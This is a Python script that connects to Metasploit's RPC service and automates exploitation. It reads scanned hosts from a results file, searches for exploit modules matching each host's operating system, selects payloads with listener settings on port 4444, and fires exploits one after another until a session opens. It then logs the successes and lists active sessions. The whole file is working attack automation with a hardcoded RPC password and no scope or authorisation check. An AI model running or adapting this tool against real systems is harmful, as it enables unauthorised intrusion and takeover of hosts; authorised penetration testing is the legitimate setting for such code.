import json
import os
from pymetasploit3.msfrpc import MsfRpcClient
from exploit_prioritizer import prioritize_exploits
from exploitpayload_selection import select_payload

LOG_FILE = 'logs/exploit_log.txt'
REPORT_FILE = 'reports/successful_exploits.json'


def load_scan_results(filepath="results/scan_results.json"):
    try:
        with open(filepath, 'r') as file:
            return json.load(file)
    except Exception as e:
        print(f"[!] Failed to load scan results: {e}")
        return []


def connect_to_metasploit(password='password123', username='msf', port=55553):
    try:
        client = MsfRpcClient(password, username=username, port=port, ssl=False)
        print("[+] Connected to Metasploit RPC")
        return client
    except Exception as e:
        print(f"[!] Failed to connect to Metasploit: {e}")
        exit(1)


def search_exploits(client, keyword):
    try:
        return client.modules.search(keyword)
    except Exception as e:
        print(f"[!] Exploit search failed: {e}")
        return []


def try_exploits(client, target_ip, exploits):
    successful_exploits = []

    for exploit in exploits:
        exploit_name = exploit['fullname']
        print(f"\n[*] Trying exploit: {exploit_name}")

        try:
            exploit_module = client.modules.use('exploit', exploit_name)
            payload_name = select_payload(client, exploit_name)
            if not payload_name:
                continue

            payload = client.modules.use('payload', payload_name)

            if 'RHOSTS' in exploit_module.options:
                exploit_module['RHOSTS'] = target_ip
            else:
                print("    ⚠ Skipping RHOSTS — not supported by this module.")

            if 'LHOST' in payload.options:
                payload['LHOST'] = '0.0.0.0'
            if 'LPORT' in payload.options:
                payload['LPORT'] = 4444

            print(f"    → Using payload: {payload_name}")
            result = exploit_module.execute(payload=payload)

            log_entry = f"{target_ip} - {exploit_name} with {payload_name}\n"
            with open(LOG_FILE, 'a') as log_file:
                log_file.write(log_entry)

            if result and 'job_id' in result:
                print(f"    ✅ Exploit launched (Job ID: {result['job_id']})")
                successful_exploits.append({
                    'ip': target_ip,
                    'exploit': exploit_name,
                    'payload': payload_name
                })
                break
            else:
                print(f"    ❌ Exploit failed or no session created")

        except Exception as e:
            print(f"    [!] Error: {e}")
            continue

    return successful_exploits


def save_successes(successes):
    if not successes:
        return
    os.makedirs(os.path.dirname(REPORT_FILE), exist_ok=True)
    try:
        with open(REPORT_FILE, 'w') as f:
            json.dump(successes, f, indent=4)
        print(f"\n[+] Successful exploits saved to {REPORT_FILE}")
    except Exception as e:
        print(f"[!] Failed to write report: {e}")


def check_sessions(client):
    print("\n[+] Checking for active sessions...")
    try:
        sessions = client.sessions.list
        if not sessions:
            print("[-] No active sessions found.")
        else:
            for sid, session in sessions.items():
                print(f"[SESSION {sid}] {session.get('type')} - {session.get('target_host')} ({session.get('via_exploit')})")
    except Exception as e:
        print(f"[!] Error retrieving sessions: {e}")


def main():
    client = connect_to_metasploit()
    scan_results = load_scan_results()

    all_successes = []

    for result in scan_results:
        target_ip = result.get('ip')
        os_name = result.get('os', '')
        print(f"\n=== Target: {target_ip} ({os_name}) ===")

        search_term = os_name.split()[0] if os_name else 'Linux'
        print(f"[+] Searching for exploits for OS: {search_term}...")
        raw_exploits = search_exploits(client, search_term)
        exploit_list = [e for e in raw_exploits if e['type'] == 'exploit']

        if not exploit_list:
            print("[!] No raw exploits found.")
            continue

        sorted_exploits = prioritize_exploits(exploit_list, os_name)
        successes = try_exploits(client, target_ip, sorted_exploits)
        all_successes.extend(successes)

    save_successes(all_successes)

    # ✅ Call the integrated session handler
    check_sessions(client)


if __name__ == '__main__':
    main()

